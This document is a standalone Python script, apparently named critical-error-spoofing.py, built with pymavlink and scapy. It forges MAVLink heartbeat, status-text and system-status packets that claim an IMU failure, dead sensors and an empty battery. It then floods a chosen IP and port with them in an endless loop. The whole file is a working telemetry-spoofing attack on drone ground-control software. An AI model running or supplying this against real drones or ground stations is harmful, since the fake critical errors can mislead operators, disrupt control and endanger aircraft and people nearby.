from pymavlink import mavutil
from scapy.all import *
import time
import sys

def create_heartbeat():
    mav = mavutil.mavlink.MAVLink(None)
    mav.srcSystem = 1
    mav.srcComponent = 1
    return mav.heartbeat_encode(
        type=mavutil.mavlink.MAV_TYPE_QUADROTOR,
        autopilot=mavutil.mavlink.MAV_AUTOPILOT_ARDUPILOTMEGA,
        base_mode=mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,
        custom_mode=3,
        system_status=mavutil.mavlink.MAV_STATE_CRITICAL
    ).pack(mav)

def create_statustext():
    mav = mavutil.mavlink.MAVLink(None)
    mav.srcSystem = 1
    mav.srcComponent = 1
    return mav.statustext_encode(
        severity=mavutil.mavlink.MAV_SEVERITY_CRITICAL,
        text="CRITICAL ERROR: IMU FAILURE".encode('utf-8')
    ).pack(mav)

def create_sys_status():
    mav = mavutil.mavlink.MAVLink(None)
    mav.srcSystem = 1
    mav.srcComponent = 1
    return mav.sys_status_encode(
        onboard_control_sensors_present=0xFFFFFFFF,
        onboard_control_sensors_enabled=0xFFFFFFFF,
        onboard_control_sensors_health=0x00000000,
        load=1000,
        voltage_battery=0,
        current_battery=0,
        battery_remaining=0,
        drop_rate_comm=1000,
        errors_comm=100,
        errors_count1=100,
        errors_count2=100,
        errors_count3=100,
        errors_count4=100
    ).pack(mav)

def send_mavlink_packet(packet_data, target_ip, target_port):
    packet = IP(dst=target_ip) / UDP(dport=target_port) / Raw(load=packet_data)
    send(packet)

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python critical-error-spoofing.py <ip:port>")
        sys.exit(1)

    target_ip, target_port = sys.argv[1].split(':')
    target_port = int(target_port)

    while True:
        send_mavlink_packet(create_heartbeat(), target_ip, target_port)
        send_mavlink_packet(create_statustext(), target_ip, target_port)
        send_mavlink_packet(create_sys_status(), target_ip, target_port)
        print(f"Sent heartbeat, STATUSTEXT, and SYS_STATUS packets to {target_ip}:{target_port} indicating a critical error")